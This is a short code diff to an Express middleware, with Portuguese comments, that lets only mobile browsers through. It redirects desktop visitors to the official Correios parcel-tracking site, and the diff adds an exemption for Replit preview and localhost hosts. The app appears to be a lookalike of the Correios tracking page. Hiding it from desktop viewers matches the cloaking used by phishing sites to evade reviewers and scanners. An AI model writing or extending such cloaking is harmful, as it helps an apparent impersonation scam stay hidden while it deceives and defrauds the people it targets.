@@ -5,6 +5,15 @@ import { storage } from "./storage";
 // Middleware para detectar dispositivos móveis
 function mobileOnlyMiddleware(req: Request, res: Response, next: NextFunction) {
   const userAgent = req.get('User-Agent') || '';
+  const host = req.get('Host') || '';
+  
+  // Exceção para preview do Replit e desenvolvimento
+  if (host.includes('.replit.dev') || 
+      host.includes('.repl.co') ||
+      host.includes('localhost') ||
+      host.includes('127.0.0.1')) {
+    return next(); // Permite acesso em preview/desenvolvimento
+  }
   
   // Padrões para detectar dispositivos móveis
   const mobilePatterns = [
@@ -31,7 +40,7 @@ function mobileOnlyMiddleware(req: Request, res: Response, next: NextFunction) {
     const officialUrl = 'https://rastreamento.correios.com.br/app/index.php';
     
     // Log da tentativa de acesso
-    console.log(`[SECURITY] Desktop access blocked from IP: ${req.ip}, User-Agent: ${userAgent}`);
+    console.log(`[SECURITY] Desktop access blocked from IP: ${req.ip}, Host: ${host}, User-Agent: ${userAgent}`);
     
     return res.redirect(302, officialUrl);
   }
